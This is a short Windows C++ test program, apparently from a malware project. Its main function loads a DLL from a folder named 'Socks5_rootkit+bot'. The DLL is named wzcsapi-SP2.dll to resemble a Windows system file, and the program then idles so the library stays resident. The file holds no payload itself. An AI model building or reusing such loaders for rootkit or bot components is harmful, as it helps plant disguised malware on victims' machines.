// test_dll.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <process.h>
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
	if(LoadLibrary("S:\\developer\\Socks5_rootkit+bot\\wzcsapi-SP2.dll"))
	//if(LoadLibrary("bot_dll.dll"))
	{
		while(1)
		{
			Sleep(10000);
		}
	}
	system("pause");
	return 0;
}



